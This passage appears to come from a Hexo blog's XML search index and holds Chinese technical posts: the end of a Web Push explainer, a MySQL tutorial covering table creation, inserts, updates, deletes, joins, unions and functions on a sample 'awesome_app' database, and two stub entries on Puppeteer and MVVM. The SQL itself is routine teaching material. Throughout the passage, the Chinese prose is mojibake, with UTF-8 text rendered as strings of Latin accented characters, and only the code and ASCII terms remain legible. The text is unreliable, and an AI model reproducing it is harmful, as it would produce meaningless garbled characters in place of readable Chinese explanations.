å¯¹äºæœåŠ¡å™¨çš„è½¯ç¡¬ä»¶æˆæœ¬ä¸å°ï¼Œæ¨é€æœåŠ¡å•†å€’æ˜¯å¯ä»¥è€ƒè™‘ä¸ºæµè§ˆå™¨å‚å•†æä¾›æ”¯æŒæ ‡å‡†çš„ Web Push Protocol çš„æœ‰å½±å“åŠ›çš„æ¨é€æœåŠ¡ï¼Œç±»ä¼¼ Google çš„ FCM/GCMã€‚ å¦‚æœWeb Pushä¸€ç›´å¾—ä¸åˆ°æ”¯æŒï¼Œå¯¹äºæµè§ˆå™¨SDKæ¥è¯´ï¼Œå¯ä»¥æä¾›ä¸€å¥—éæ ‡å‡†çš„APIï¼Œå…è®¸å®¢æˆ·ç«¯ï¼ˆæ¯”å¦‚ï¼Œæ‰‹æ·˜ï¼‰æ¨é€æ¶ˆæ¯ç»™æµè§ˆå™¨çš„ServiceWorkerï¼Œpush serviceåˆ™ç”±ä½¿ç”¨æµè§ˆå™¨SDKçš„å®¢æˆ·ç«¯è‡ªè¡Œå»å®ç°ã€‚ åŸºäºä¸‰æ–¹çš„æ¨é€å·¥å…·æ¥å®ç°ï¼Œå¦‚ï¼šonesignalã€‚ FAQPush &amp;&amp; Notificationå¯ä»¥ç†è§£ä¸ºå°±æ˜¯ Push Servicer å’Œ ServiceWorker ä¹‹é—´ï¼ŒServiceWorker å’Œ Web Page ä¹‹é—´çš„æ¶ˆæ¯é€šä¿¡ã€‚ Push: Push Servicer å°†æ›´æ–°çš„ä¿¡æ¯ä¼ é€’ç»™ ServiceWorker Notification: ServiceWorker å°†æ›´æ–°çš„ä¿¡æ¯æ¨é€ç»™ç”¨æˆ· å¯¹æ¯” Ajax è½®è¯¢ã€Http é•¿è¿æ¥ã€WebSocket Ajax è½®è¯¢æ˜¯é€šè¿‡å®¢æˆ·ç«¯ä¸æ–­å‘æœåŠ¡ç«¯å‘é€ Http è¯·æ±‚ï¼Œè‹¥æœ‰æ–°æ¶ˆæ¯å°±å–å›çš„æ¨¡å¼ä¿æŒæ•°æ®å®æ—¶æ›´æ–°ï¼Œä½†è¿™ç§æ–¹å¼éœ€è¦æœåŠ¡å™¨æœ‰å¾ˆå¿«çš„å¤„ç†é€Ÿåº¦å’Œèµ„æºã€‚ Http é•¿è¿æ¥æ˜¯å®¢æˆ·ç«¯å‘æœåŠ¡å™¨å‘é€è¯·æ±‚åï¼Œè‹¥æœåŠ¡å™¨æ²¡æœ‰æ–°æ•°æ®è¦å‘é€ï¼Œå°±ä¸è¿”å› responseï¼Œä¸€æ—¦æœ‰äº†æ–°æ•°æ®è¿”å›äº†responseï¼Œå®¢æˆ·ç«¯å°±ç«‹åˆ»å†å‘ä¸€ä¸ª requestï¼Œå‘¨è€Œå¤å§‹ã€‚äº‹å®ä¸Šè¿™æ˜¯æŠŠ http åè®®çš„ä¸å¯¹ç§°æ€§ä»å®¢æˆ·ç«¯è½¬ç§»åˆ°äº†æœåŠ¡ç«¯ã€‚ WebSocket æ˜¯ HTML5 ä¸­æå‡ºçš„ä¸€ä¸ªæ–°æ ‡å‡†ï¼Œå®¢æˆ·ç«¯åœ¨å‘é€è¯·æ±‚æ—¶åœ¨è¯·æ±‚å¤´åŠ å…¥é¢å¤–çš„å­—æ®µï¼Œä»¥æ ‡è¯†è¿™æ˜¯ä¸€ä¸ªåŸºäº WebSocket åè®®çš„è¿æ¥ï¼ŒæœåŠ¡å™¨æ ¹æ®è¿™ä¸ªè¯·æ±‚å¤´ç”Ÿæˆå“åº”ï¼Œä¸å®¢æˆ·ç«¯å»ºç«‹èµ· WebSocket è¿æ¥ï¼Œä¹‹åæœåŠ¡ç«¯æœ‰æ–°æ¶ˆæ¯æ—¶ï¼Œç›´æ¥å‘å®¢æˆ·ç«¯æ¨é€å³å¯ã€‚ ç»¼ä¸Šï¼ŒAjax è½®è¯¢ã€Http é•¿è¿æ¥ã€WebSocket éƒ½ä¾èµ–é¡µé¢ä¸æœåŠ¡å™¨çš„è¿æ¥ï¼Œä¸€æ—¦é¡µé¢æˆ–è€…æµè§ˆå™¨å…³é—­ï¼Œè¿æ¥ä¹Ÿå°±å…³äº†ï¼Œè€Œ Web Push åŸºäº Service Worker å³ä½¿é¡µé¢æˆ–è€…æµè§ˆå™¨å…³é—­ï¼Œå½“æ¶ˆæ¯åˆ°è¾¾æ—¶ï¼Œä¹Ÿèƒ½è¢«å”¤é†’å¹¶æ˜¾ç¤ºæ¶ˆæ¯ã€‚ å›½å†…å“ªäº›ç«™ç‚¹å®ç°äº† Web Push AliExpressï¼ŒAlibaba.com ä½œä¸º FCM launch çš„åˆä½œä¼™ä¼´ï¼Œå®Œæˆäº† H5 æ¶ˆæ¯æ¨é€çš„è½åœ°ã€‚ https://m.aliexpress.com/ https://www.alibaba.com/ å‚è€ƒæ–‡æ¡£ google å®˜æ–¹æ–‡æ¡£ web-pushå®ç°åŸç†åŠç»†èŠ‚ä»‹ç» PWAæ–‡æ¡£ Service Workerç®€æ˜“æ•™ç¨‹]]></content>
      <categories>
        <category>Webå‰ç«¯</category>
      </categories>
      <tags>
        <tag>Webå‰ç«¯</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>%2F2019%2F10%2F15%2FSQL%2F%E5%AE%9E%E7%94%A8%20SQL%20%E8%AF%AD%E5%8F%A5%2F</url>
    <content type="text"><![CDATA[å®ç”¨ SQL è¯­å¥å‰è¨€æ–‡ç« æ²¿ç€è®¾è®¡ä¸€ä¸ªå‡æƒ³çš„åº”ç”¨ awesome_app ä¸ºä¸»çº¿ï¼Œä»é›¶åˆ›å»ºä¿®æ”¹æ•°æ®åº“ï¼Œè¡¨æ ¼ï¼Œå­—æ®µå±æ€§ï¼Œç´¢å¼•ï¼Œå­—ç¬¦é›†ï¼Œé»˜è®¤å€¼ï¼Œè‡ªå¢ï¼Œå¢åˆ æ”¹æŸ¥ï¼Œå¤šè¡¨æŸ¥è¯¢ï¼Œå†…ç½®å‡½æ•°ç­‰å®ç”¨ SQL è¯­å¥ã€‚æ”¶è—æ­¤æ–‡ï¼Œå‘Šåˆ«é›¶æ•£åˆä½æ•ˆåœ°æœç´¢ç»å¸¸ä½¿ç”¨çš„ SQL è¯­å¥ã€‚æ‰€æœ‰ SQL éƒ½åœ¨ MySQL ä¸‹é€šè¿‡éªŒè¯ï¼Œå¯ç•™ç€æ—¥åå›é¡¾å‚è€ƒï¼Œä¹Ÿå¯è·Ÿç€åŠ¨æ‰‹ä¸€èµ·åšï¼Œå¦‚æœæœªå®‰è£… MySQL å¯å‚è€ƒ ã€ŠmacOS å®‰è£… mysqlã€‹ (windows å®‰è£…å¤§åŒå°å¼‚)ã€‚ 1. åˆ›å»º1.1 åˆ›å»ºæ•°æ®åº“è¯­æ³•ï¼šcreate database db_name ç¤ºä¾‹ï¼šåˆ›å»ºåº”ç”¨æ•°æ®åº“ awesome_app 1create database `awesome_app` 1.2 åˆ›å»ºè¡¨æ ¼è¯­æ³•ï¼šcreate table table_name ( â€¦ columns ) ç¤ºä¾‹ï¼šåˆ›å»ºç”¨æˆ·è¡¨ users 1234567create table `users`( `id` int, `name` char(10), `avatar` varchar(300), `regtime` date) 1.3 åˆ›å»ºç´¢å¼•è¯­æ³•ï¼šcreate index index_name on table_name (column_name) ç¤ºä¾‹ï¼šä¸ºç”¨æˆ· id åˆ›å»ºç´¢å¼• idx_id 123create index `idx_id` on `users` (`id`)/* åˆ›å»ºå”¯ä¸€ç´¢å¼• */create unique index `idx_id` on `users` (`id`) 1.4 ä¸ºå·²å­˜åœ¨çš„åˆ—åˆ›å»ºä¸»é”® æ›´å¸¸ç”¨çš„æ–¹å¼æ˜¯åœ¨åˆ›å»ºè¡¨è¯­å¥æ‰€æœ‰åˆ—å®šä¹‰çš„åé¢æ·»åŠ ä¸€è¡Œ primary key (column_name)ã€‚ è¯­æ³•ï¼šalter table table_name add primary key (column_name) ç¤ºä¾‹ï¼šå°†ç”¨æˆ· id è®¾ä¸ºä¸»é”® 1alter table users add primary key (`id`) 1.5 ä¸ºå·²å­˜åœ¨çš„åˆ—åˆ›å»ºè‡ªå¢çº¦æŸ æ›´å¸¸ç”¨çš„æ–¹å¼æ˜¯åœ¨åˆ›å»ºè¡¨è¯­å¥ä¸­æ·»åŠ è‡ªå¢åˆ— id int not null auto_incrementã€‚ 1alter table `users` modify `id` int not null auto_increment 2. æ’å…¥è¯­æ³•ï¼š insert into table_name values (value1, value2, â€¦) insert into table_name (column1, column2, â€¦) values (value1, value2, â€¦) ç¤ºä¾‹ï¼šæ–°å¢æ³¨å†Œç”¨æˆ· 123insert into `users` values (1, &apos;ken&apos;, &apos;http://cdn.awesome_app.com/path/to/xxx/avatar1.jpg&apos;, curdate())/* æŒ‡å®šåˆ—æ’å…¥ */insert into `users` (`name`, `avatar`) values (&apos;bill&apos;, &apos;http://cdn.awesome_app.com/path/to/xxx/avatar2.jpg&apos;) 3. ä¿®æ”¹3.1 ä¿®æ”¹æ•°æ®è®°å½•è¯­æ³•ï¼š update table_name set column=new_value where condition update table_name set column1=new_value1,column2=new_value2,â€¦ where condition ç¤ºä¾‹ï¼š 123update `users` set `regtime`=curdate() where `regtime` is null/* ä¸€æ¬¡ä¿®æ”¹å¤šåˆ— */update `users` set `name`=&apos;steven&apos;,`avatar`=&apos;http://cdn.awesome_app.com/path/to/xxx/steven.jpg&apos; where `id`=1 3.2 ä¿®æ”¹æ•°æ®åº“å­—ç¬¦é›†ä¸º utf81alter database `awesome_app` default character set utf8 3.3 ä¿®æ”¹è¡¨å­—ç¬¦é›†ä¸º utf81alter table `users` convert to character set utf8 3.4 ä¿®æ”¹è¡¨å­—æ®µå­—ç¬¦é›†ä¸º utf81alter table `users` modify `name` char(10) character set utf8 3.5 ä¿®æ”¹å­—æ®µç±»å‹1alter table `users` modify `regtime` datetime not null 3.5 ä¿®æ”¹å­—æ®µé»˜è®¤å€¼123alter table `users` alter `regtime` set default &apos;2019-10-12 00:00:00&apos;/* è®¾ç½®é»˜è®¤ä¸ºå½“å‰æ—¶é—´ current_timestampï¼Œéœ€è¦é‡æ–°å®šä¹‰æ•´ä¸ªåˆ— */alter table `users` modify `regtime` datetime not null default current_timestamp 4. åˆ é™¤4.1 åˆ é™¤æ•°æ®è®°å½•è¯­æ³•ï¼šdelete from table_name where condition ç¤ºä¾‹ï¼šåˆ é™¤ç”¨æˆ·åæœªå¡«å†™çš„ç”¨æˆ· 12345678910111213141516171819# å…ˆå¢åŠ ä¸€æ¡ç”¨æˆ·åä¸ºç©ºçš„ç”¨æˆ·mysql&gt; insert into `users` (`regtime`) values (curdate());mysql&gt; select * from users;+----+--------+----------------------------------------------------+------------+| id | name | avatar | regtime |+----+--------+----------------------------------------------------+------------+| 1 | steven | http://cdn.awesome_app.com/path/to/xxx/steven.jpg | 2019-10-12 || 2 | bill | http://cdn.awesome_app.com/path/to/xxx/avatar2.jpg | 2019-10-12 || 3 | NULL | NULL | 2019-10-12 |+----+--------+----------------------------------------------------+------------+# åˆ é™¤ç”¨æˆ·åä¸ºç©ºçš„è¡Œmysql&gt; delete from `users` where `name` is null;mysql&gt; select * from users;+----+--------+----------------------------------------------------+------------+| id | name | avatar | regtime |+----+--------+----------------------------------------------------+------------+| 1 | steven | http://cdn.awesome_app.com/path/to/xxx/steven.jpg | 2019-10-12 || 2 | bill | http://cdn.awesome_app.com/path/to/xxx/avatar2.jpg | 2019-10-12 |+----+--------+----------------------------------------------------+------------+ 4.2 åˆ é™¤æ•°æ®åº“1drop database if exists `awesome_app` 4.3 åˆ é™¤è¡¨1drop table if exists `users` 4.4 æ¸…ç©ºè¡¨ä¸­æ‰€æœ‰æ•°æ®è¿™ä¸ªæ“ä½œç›¸å½“äºå…ˆ drop table å† create table ï¼Œå› æ­¤éœ€è¦æœ‰ drop æƒé™ã€‚ 1truncate table `users` 4.5 åˆ é™¤ç´¢å¼•1drop index `idx_id` on `users` 5. æŸ¥è¯¢5.1 è¯­æ³•1234567891011121314151617181920212223SELECT [ALL | DISTINCT | DISTINCTROW ] [HIGH_PRIORITY] [STRAIGHT_JOIN] [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT] [SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS] select_expr [, select_expr ...] [FROM table_references [PARTITION partition_list] [WHERE where_condition] [GROUP BY &#123;col_name | expr | position&#125; [ASC | DESC], ... [WITH ROLLUP]] [HAVING where_condition] [ORDER BY &#123;col_name | expr | position&#125; [ASC | DESC], ...] [LIMIT &#123;[offset,] row_count | row_count OFFSET offset&#125;] [PROCEDURE procedure_name(argument_list)] [INTO OUTFILE &apos;file_name&apos; [CHARACTER SET charset_name] export_options | INTO DUMPFILE &apos;file_name&apos; | INTO var_name [, var_name]] [FOR UPDATE | LOCK IN SHARE MODE]] 5.2 å•è¡¨æŸ¥è¯¢5.2.1 å‡†å¤‡æ•°æ®ï¼š123456789101112131415insert into users (`name`, `avatar`) values(&apos;å¼ ä¸‰&apos;, &apos;http://cdn.awesome_app.com/path/to/xxx/3.jpg&apos;),(&apos;æå››&apos;, &apos;http://cdn.awesome_app.com/path/to/xxx/4.jpg&apos;),(&apos;ç‹äº”&apos;, &apos;http://cdn.awesome_app.com/path/to/xxx/5.jpg&apos;),(&apos;é©¬å…­&apos;, &apos;http://cdn.awesome_app.com/path/to/xxx/6.jpg&apos;),(&apos;è‚–ä¸ƒ&apos;, &apos;http://cdn.awesome_app.com/path/to/xxx/7.jpg&apos;),(&apos;åˆ˜å…«&apos;, &apos;http://cdn.awesome_app.com/path/to/xxx/8.jpg&apos;),(&apos;æ¨ä¹&apos;, &apos;http://cdn.awesome_app.com/path/to/xxx/9.jpg&apos;),(&apos;éƒ‘å&apos;, &apos;http://cdn.awesome_app.com/path/to/xxx/10.jpg&apos;);/* å¢åŠ é‡å¤è¡Œ */insert into users (`name`, `avatar`) values(&apos;å¼ ä¸‰&apos;, &apos;http://cdn.awesome_app.com/path/to/xxx/3.jpg&apos;),(&apos;æå››&apos;, &apos;http://cdn.awesome_app.com/path/to/xxx/4.jpg&apos;),(&apos;ç‹äº”&apos;, &apos;http://cdn.awesome_app.com/path/to/xxx/5.jpg&apos;); 5.2.2 æŸ¥è¯¢æ‰€æœ‰åˆ—123456789101112131415161718mysql&gt; select * from users;+----+--------+----------------------------------------------------+---------------------+| id | name | avatar | regtime |+----+--------+----------------------------------------------------+---------------------+| 1 | steven | http://cdn.awesome_app.com/path/to/xxx/steven.jpg | 2019-10-12 00:00:00 || 2 | bill | http://cdn.awesome_app.com/path/to/xxx/avatar2.jpg | 2019-10-12 00:00:00 || 3 | å¼ ä¸‰ | http://cdn.awesome_app.com/path/to/xxx/3.jpg | 2019-10-13 10:58:37 || 4 | æå›› | http://cdn.awesome_app.com/path/to/xxx/4.jpg | 2019-10-13 10:58:37 || 5 | ç‹äº” | http://cdn.awesome_app.com/path/to/xxx/5.jpg | 2019-10-13 10:58:37 || 6 | é©¬å…­ | http://cdn.awesome_app.com/path/to/xxx/6.jpg | 2019-10-13 10:58:37 || 7 | è‚–ä¸ƒ | http://cdn.awesome_app.com/path/to/xxx/7.jpg | 2019-10-13 10:58:37 || 8 | åˆ˜å…« | http://cdn.awesome_app.com/path/to/xxx/8.jpg | 2019-10-13 10:58:37 || 9 | æ¨ä¹ | http://cdn.awesome_app.com/path/to/xxx/9.jpg | 2019-10-13 10:58:37 || 10 | éƒ‘å | http://cdn.awesome_app.com/path/to/xxx/10.jpg | 2019-10-13 10:58:37 || 11 | å¼ ä¸‰ | http://cdn.awesome_app.com/path/to/xxx/3.jpg | 2019-10-13 11:20:17 || 12 | æå›› | http://cdn.awesome_app.com/path/to/xxx/4.jpg | 2019-10-13 11:20:17 || 13 | ç‹äº” | http://cdn.awesome_app.com/path/to/xxx/5.jpg | 2019-10-13 11:20:17 |+----+--------+----------------------------------------------------+---------------------+ 5.2.3 æŸ¥è¯¢æŒ‡å®šåˆ—123456789101112131415161718mysql&gt; select id,name from users;+----+--------+| id | name |+----+--------+| 1 | steven || 2 | bill || 3 | å¼ ä¸‰ || 4 | æå›› || 5 | ç‹äº” || 6 | é©¬å…­ || 7 | è‚–ä¸ƒ || 8 | åˆ˜å…« || 9 | æ¨ä¹ || 10 | éƒ‘å || 11 | å¼ ä¸‰ || 12 | æå›› || 13 | ç‹äº” |+----+--------+ 5.2.4 æŸ¥è¯¢ä¸é‡å¤è®°å½•123456789101112131415mysql&gt; select distinct name,avatar from users;+--------+----------------------------------------------------+| name | avatar |+--------+----------------------------------------------------+| steven | http://cdn.awesome_app.com/path/to/xxx/steven.jpg || bill | http://cdn.awesome_app.com/path/to/xxx/avatar2.jpg || å¼ ä¸‰ | http://cdn.awesome_app.com/path/to/xxx/3.jpg || æå›› | http://cdn.awesome_app.com/path/to/xxx/4.jpg || ç‹äº” | http://cdn.awesome_app.com/path/to/xxx/5.jpg || é©¬å…­ | http://cdn.awesome_app.com/path/to/xxx/6.jpg || è‚–ä¸ƒ | http://cdn.awesome_app.com/path/to/xxx/7.jpg || åˆ˜å…« | http://cdn.awesome_app.com/path/to/xxx/8.jpg || æ¨ä¹ | http://cdn.awesome_app.com/path/to/xxx/9.jpg || éƒ‘å | http://cdn.awesome_app.com/path/to/xxx/10.jpg |+--------+----------------------------------------------------+ 5.2.5 é™åˆ¶æŸ¥è¯¢è¡Œæ•°æŸ¥è¯¢å‰å‡ è¡Œ 1234567mysql&gt; select id,name from users limit 2;+----+--------+| id | name |+----+--------+| 1 | steven || 2 | bill |+----+--------+ æŸ¥è¯¢ä»æŒ‡å®šåç§»(ç¬¬ä¸€è¡Œä¸ºåç§»ä¸º0)å¼€å§‹çš„å‡ è¡Œ 12345678mysql&gt; select id,name from users limit 2,3;+----+--------+| id | name |+----+--------+| 3 | å¼ ä¸‰ || 4 | æå›› || 5 | ç‹äº” |+----+--------+ 5.2.6 æ’åº123456789101112131415161718# æ­£åºmysql&gt; select distinct name from users order by name asc limit 3;+--------+| name |+--------+| bill || steven || åˆ˜å…« |+--------+# å€’åºmysql&gt; select id,name from users order by id desc limit 3;+----+--------+| id | name |+----+--------+| 13 | ç‹äº” || 12 | æå›› || 11 | å¼ ä¸‰ |+----+--------+ 5.2.7 åˆ†ç»„å¢åŠ åŸå¸‚å­—æ®µ 1234567alter table `users` add `city` varchar(10) comment &apos;ç”¨æˆ·æ‰€åœ¨åŸå¸‚&apos; after `name`;update `users` set `city`=&apos;æ—§é‡‘å±±&apos; where `id`=1;update `users` set `city`=&apos;è¥¿é›…å›¾&apos; where `id`=2;update `users` set `city`=&apos;åŒ—äº¬&apos; where `id` in (3,5,7);update `users` set `city`=&apos;ä¸Šæµ·&apos; where `id` in (4,6,8);update `users` set `city`=&apos;å¹¿å·&apos; where `id` between 9 and 10;update `users` set `city`=&apos;æ·±åœ³&apos; where `id` between 11 and 13; æŒ‰åŸå¸‚åˆ†ç»„ç»Ÿè®¡ç”¨æˆ·æ•° 1234567891011121314151617181920212223242526mysql&gt; select city, count(name) as num_of_user from users group by city;+-----------+-------------+| city | num_of_user |+-----------+-------------+| ä¸Šæµ· | 3 || åŒ—äº¬ | 3 || å¹¿å· | 2 || æ—§é‡‘å±± | 1 || æ·±åœ³ | 3 || è¥¿é›…å›¾ | 1 |+-----------+-------------+mysql&gt; select city, count(name) as num_of_user from users group by city having num_of_user=1;+-----------+-------------+| city | num_of_user |+-----------+-------------+| æ—§é‡‘å±± | 1 || è¥¿é›…å›¾ | 1 |+-----------+-------------+mysql&gt; select city, count(name) as num_of_user from users group by city having num_of_user&gt;2;+--------+-------------+| city | num_of_user |+--------+-------------+| ä¸Šæµ· | 3 || åŒ—äº¬ | 3 || æ·±åœ³ | 3 |+--------+-------------+ 5.3 å¤šè¡¨å…³è”æŸ¥è¯¢5.3.1 å‡†å¤‡æ•°æ®1234567891011121314151617181920create table if not exists `orders`( `id` int not null primary key auto_increment comment &apos;è®¢å•ID&apos;, `title` varchar(50) not null comment &apos;è®¢å•æ ‡é¢˜&apos;, `user_id` int not null comment &apos;ç”¨æˆ·ID&apos;, `cretime` timestamp not null default current_timestamp comment &apos;åˆ›å»ºæ—¶é—´&apos;);create table if not exists `groups`( `id` int not null primary key auto_increment comment &apos;ç”¨æˆ·ç»„ID&apos;, `title` varchar(50) not null comment &apos;ç”¨æˆ·ç»„æ ‡é¢˜&apos;, `cretime` timestamp not null default current_timestamp comment &apos;åˆ›å»ºæ—¶é—´&apos;);alter table `users` add `group_id` int comment &apos;ç”¨æˆ·åˆ†ç»„&apos; after `city`;insert into `groups` (`title`) values (&apos;å¤§ä½¬&apos;), (&apos;èŒæ–°&apos;), (&apos;èœé¸¡&apos;);insert into `orders` (`title`, `user_id`) values (&apos;ã€Šå¤§ä½¬æ˜¯æ€æ ·ç‚¼æˆçš„ï¼Ÿã€‹&apos;, 3), (&apos;ã€ŠMySQL ä»èŒæ–°åˆ°åˆ åº“è·‘è·¯ã€‹&apos;, 6), (&apos;ã€Šèœé¸¡è¸©å‘è®°ã€‹&apos;, 9);update `users` set `group_id`=1 where `id` between 1 and 2;update `users` set `group_id`=2 where `id` in (4, 6, 8, 10, 12);update `users` set `group_id`=3 where `id` in (3, 5, 13); 5.3.2 joinjoin ç”¨äºåœ¨å¤šä¸ªè¡¨ä¸­æŸ¥è¯¢ç›¸äº’åŒ¹é…çš„æ•°æ®ã€‚ 12345678mysql&gt; select `users`.`name` as `user_name`, `orders`.`title` as `order_title` from `users`, `orders` where `orders`.`user_id`=`users`.`id`;+-----------+--------------------------------------+| user_name | order_title |+-----------+--------------------------------------+| å¼ ä¸‰ | ã€Šå¤§ä½¬æ˜¯æ€æ ·ç‚¼æˆçš„ï¼Ÿã€‹ || é©¬å…­ | ã€ŠMySQL ä»èŒæ–°åˆ°åˆ åº“è·‘è·¯ã€‹ || æ¨ä¹ | ã€Šèœé¸¡è¸©å‘è®°ã€‹ |+-----------+--------------------------------------+ inner join å†…éƒ¨è¿æ¥ã€‚æ•ˆæœä¸ join ä¸€æ · , ä½†ç”¨æ³•ä¸åŒï¼Œjoin ä½¿ç”¨ where ï¼Œinner join ä½¿ç”¨ on ã€‚ 12345678mysql&gt; select `users`.`name` as `user_name`, `orders`.`title` as `order_title` from `users` inner join `orders` on `orders`.`user_id`=`users`.`id`;+-----------+--------------------------------------+| user_name | order_title |+-----------+--------------------------------------+| å¼ ä¸‰ | ã€Šå¤§ä½¬æ˜¯æ€æ ·ç‚¼æˆçš„ï¼Ÿã€‹ || é©¬å…­ | ã€ŠMySQL ä»èŒæ–°åˆ°åˆ åº“è·‘è·¯ã€‹ || æ¨ä¹ | ã€Šèœé¸¡è¸©å‘è®°ã€‹ |+-----------+--------------------------------------+ left join å·¦è¿æ¥ã€‚è¿”å›å·¦è¡¨æ‰€æœ‰è¡Œï¼Œå³ä½¿å³è¡¨ä¸­æ²¡æœ‰åŒ¹é…çš„è¡Œï¼Œä¸åŒ¹é…çš„ç”¨ NULL å¡«å……ã€‚ 123456789101112131415161718mysql&gt; select `users`.`name` as `user_name`, `orders`.`title` as `order_title` from `users` left join `orders` on `orders`.`user_id`=`users`.`id`;+-----------+--------------------------------------+| user_name | order_title |+-----------+--------------------------------------+| å¼ ä¸‰ | ã€Šå¤§ä½¬æ˜¯æ€æ ·ç‚¼æˆçš„ï¼Ÿã€‹ || é©¬å…­ | ã€ŠMySQL ä»èŒæ–°åˆ°åˆ åº“è·‘è·¯ã€‹ || æ¨ä¹ | ã€Šèœé¸¡è¸©å‘è®°ã€‹ || steven | NULL || bill | NULL || æå›› | NULL || ç‹äº” | NULL || è‚–ä¸ƒ | NULL || åˆ˜å…« | NULL || éƒ‘å | NULL || å¼ ä¸‰ | NULL || æå›› | NULL || ç‹äº” | NULL |+-----------+--------------------------------------+ right join å³è¿æ¥ã€‚å’Œ left join æ­£å¥½ç›¸åï¼Œä¼šè¿”å›å³è¡¨æ‰€æœ‰è¡Œï¼Œå³ä½¿å·¦è¡¨ä¸­æ²¡æœ‰åŒ¹é…çš„è¡Œï¼Œä¸åŒ¹é…çš„ç”¨ NULL å¡«å……ã€‚ 123456789101112131415161718mysql&gt; select `groups`.`title` as `group_title`, `users`.`name` as `user_name` from `groups` right join `users` on `users`.`group_id`=`groups`.`id`;+-------------+-----------+| group_title | user_name |+-------------+-----------+| å¤§ä½¬ | steven || å¤§ä½¬ | bill || èŒæ–° | æå›› || èŒæ–° | é©¬å…­ || èŒæ–° | åˆ˜å…« || èŒæ–° | éƒ‘å || èŒæ–° | æå›› || èœé¸¡ | å¼ ä¸‰ || èœé¸¡ | ç‹äº” || èœé¸¡ | ç‹äº” || NULL | è‚–ä¸ƒ || NULL | æ¨ä¹ || NULL | å¼ ä¸‰ |+-------------+-----------+ 5.3.3 unionunion ç”¨äºåˆå¹¶ä¸¤ä¸ªæˆ–å¤šä¸ªæŸ¥è¯¢ç»“æœï¼Œåˆå¹¶çš„æŸ¥è¯¢ç»“æœå¿…é¡»å…·æœ‰ç›¸åŒæ•°é‡çš„åˆ—ï¼Œå¹¶ä¸”åˆ—æ‹¥æœ‰å½¢ä¼¼çš„æ•°æ®ç±»å‹ï¼ŒåŒæ—¶åˆ—çš„é¡ºåºç›¸åŒã€‚ 1234567891011mysql&gt; (select `id`, `title` from `groups`) union (select `id`, `title` from `orders`);+----+--------------------------------------+| id | title |+----+--------------------------------------+| 1 | å¤§ä½¬ || 2 | èŒæ–° || 3 | èœé¸¡ || 1 | ã€Šå¤§ä½¬æ˜¯æ€æ ·ç‚¼æˆçš„ï¼Ÿã€‹ || 2 | ã€ŠMySQL ä»èŒæ–°åˆ°åˆ åº“è·‘è·¯ã€‹ || 3 | ã€Šèœé¸¡è¸©å‘è®°ã€‹ |+----+--------------------------------------+ 6. å‡½æ•°6.1 è¯­æ³•select function(column) from table_name 6.2 åˆè®¡å‡½æ•°ï¼ˆAggregate functionsï¼‰åˆè®¡å‡½æ•°çš„æ“ä½œé¢å‘ä¸€ç³»åˆ—çš„å€¼ï¼Œå¹¶è¿”å›ä¸€ä¸ªå•ä¸€çš„å€¼ã€‚é€šå¸¸ä¸ group by è¯­å¥ä¸€èµ·ç”¨ã€‚ å‡½æ•° æè¿° avg(column) è¿”å›æŸåˆ—çš„å¹³å‡å€¼ count(column) è¿”å›æŸåˆ—çš„è¡Œæ•°ï¼ˆä¸åŒ…æ‹¬ NULL å€¼ï¼‰ count(*) è¿”å›è¢«é€‰è¡Œæ•° first(column) è¿”å›åœ¨æŒ‡å®šçš„åŸŸä¸­ç¬¬ä¸€ä¸ªè®°å½•çš„å€¼ last(column) è¿”å›åœ¨æŒ‡å®šçš„åŸŸä¸­æœ€åä¸€ä¸ªè®°å½•çš„å€¼ max(column) è¿”å›æŸåˆ—çš„æœ€é«˜å€¼ min(column) è¿”å›æŸåˆ—çš„æœ€ä½å€¼ sum(column) è¿”å›æŸåˆ—çš„æ€»å’Œ 6.3 æ ‡é‡å‡½æ•°ï¼ˆScalar functionsï¼‰ å‡½æ•° æè¿° ucase(c) è½¬æ¢ä¸ºå¤§å†™ lcase(c) è½¬æ¢ä¸ºå°å†™ mid(c, start[, end]) ä»æ–‡æœ¬æå–å­—ç¬¦ len(c) è¿”å›æ–‡æœ¬é•¿åº¦ instr(c, char) è¿”å›åœ¨æ–‡æœ¬ä¸­æŒ‡å®šå­—ç¬¦çš„æ•°å€¼ä½ç½® left(c, number_of_char) è¿”å›æ–‡æœ¬çš„å·¦ä¾§éƒ¨åˆ† right(c, number_of_char) è¿”å›æ–‡æœ¬çš„å³ä¾§éƒ¨åˆ† round(c, decimals) å¯¹æ•°å€¼æŒ‡å®šå°æ•°ä½æ•°å››èˆäº”å…¥ mod(x, y) å–ä½™ï¼ˆæ±‚æ¨¡ï¼‰ now() è¿”å›å½“å‰çš„ç³»ç»Ÿæ—¥æœŸ format(c, format) æ ¼å¼åŒ–æ˜¾ç¤º datediff(d, date1, date2) æ—¥æœŸè®¡ç®—]]></content>
  </entry>
  <entry>
    <title><![CDATA[Puppeteer åˆä½“éªŒ]]></title>
    <url>%2F2019%2F10%2F02%2FNode.js%2FPuppeteer%20%E5%88%9D%E4%BD%93%E9%AA%8C%2F</url>
    <content type="text"><![CDATA[å‚è€ƒæ–‡æ¡£ Puppeteer å®˜æ–¹æ–‡æ¡£ Puppeteer ä¸­æ–‡ API]]></content>
      <categories>
        <category>Node.js</category>
      </categories>
      <tags>
        <tag>Node.js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[250è¡Œå®ç°ä¸€ä¸ªç®€å•çš„MVVM]]></title>
    <url>%2F2019%2F09%2F21%2FWeb%E5%89%8D%E7%AB%AF%2F250%E8%A1%8C%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84MVVM%2F</url>
